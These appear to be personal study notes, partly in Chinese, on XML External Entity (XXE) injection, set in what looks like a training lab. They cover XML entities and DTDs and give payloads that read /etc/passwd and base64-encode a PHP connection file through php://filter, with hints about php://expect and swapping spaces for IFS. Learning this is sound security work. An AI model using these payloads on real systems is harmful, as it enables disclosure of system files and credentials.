* https://www.convertjson.com/json-to-xml.htm
* xml
```xml=
<?xml version="1.0" encoding="UTF-8"?>
<email>
  <date>01-01-2022</date>
  <time>10:00 am UTC</time>
  <sender>john@inlanefreight.com</sender>
  <recipients>
    <to>HR@inlanefreight.com</to>
    <cc>
        <to>billing@inlanefreight.com</to>
        <to>payslips@inlanefreight.com</to>
    </cc>
  </recipients>
  <body>
  Hello,
      Kindly share with me the invoice for the payment made on January 1, 2022.
  Regards,
  John
  </body> 
</email>
```
```xml=
<?xml version="1.0" encoding="UTF-8"?>
  <root>
    <name>123</name>
    <tel>123</tel>
    <email>123@abc.xyz</email>
    <message>123</message>
  </root>
```
* < > call <span style=color:red>TAG</span>
* Entity
    * XML variables, usually wrapped with (&/;) characters
        * &lt
---
* XML Document Type Definition（DTD）
* 一旦我們定義了一個實體，就可以在 XML 文件中透過 & 和分號 ;（例如&company;）來引用它。每當引用實體時，XML filter都會將其替換為其值。然而，最有趣的是，我們可以reference External XML Entities使用SYSTEM關鍵字，後面跟著外部實體的路徑，如下所示
```xml=
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [
  <!ENTITY company SYSTEM "http://localhost/company.txt">
  <!ENTITY signature SYSTEM "file:///var/www/html/signature.txt">
]>
```
```xml=
<!DOCTYPE email [
  <!ENTITY company SYSTEM "file:///etc/passwd">
]>
```
# <span style=color:#44D62C>Local File Disclosure</span>
* Identifying web pages that accept an XML user input
```xml
<!DOCTYPE email [
  <!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=connection.php">
]>
```
![Screenshot_20240520_165423](https://hackmd.io/_uploads/B1fA1cu7C.jpg)

* PHP://expect
:::warning
avoid breaking the XML syntax
* |, >, {
* spaces
    * change as IFS
:::

# <span style=color:#44D62C>File Disclosure</span>